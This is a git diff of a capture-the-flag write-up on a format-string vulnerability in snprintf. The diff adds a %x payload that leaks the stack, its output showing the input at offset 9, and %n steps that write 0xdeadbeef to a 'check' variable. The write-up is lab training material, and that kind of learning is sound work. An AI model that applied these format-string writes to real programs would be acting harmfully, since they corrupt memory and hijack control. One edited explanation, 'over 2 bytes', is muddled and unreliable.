@@ -46,17 +46,22 @@ int main( int argc, char ** argv )
 ```
 Our aim is overwriting the **check**'s value. We leverage a vulnerability in 
 `snprintf( fmt, sizeof(fmt), argv[1] );` 
-with no format specifier. Examine the stack and find a way to change that value.
+with no **format specifier**. Examine the stack and find a way to change that value.
 
 ### Solution:
-Let's try looking into the stack by usual payload<br>
-`./ch14 $(python -c "print 'AAAA' + '%x'")`<br>
+Let's try looking into the stack by usual payload to discover the posibility of overwritting and "scanning" the stack<br>
+`./ch14 $(python -c "print 'AAAA' + '%x.'*128")`<br>
 Output:
 ```
+check at 0xbffff958
+argv[1] = [AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.]
+fmt=[AAAA80485f1.0.0.c2.bffffaa4.b7fe1449.f63d4e2e.4030201.41414141.38343038.2e316635.2e302e30.622e3263.66666666.2e346161.65663762.3]
+check=0x4030201
 ```
+As shown, the "AAAA" value is written in 9th location. 
 
 Exploit:
-"0xdeadbeef"  is too large (over 32 bits), we have to divide **check** into **0xdead (57005)** and **0xbeef (48879)**.
+"0xdeadbeef"  is too large (over 2 bytes), we have to divide **check** into **0xdead (57005)** and **0xbeef (48879)**.
 7 times %8x to pull esp in front of the check.
 %48811c%n output (0xbeef)
 %8126c%n(0xdead)
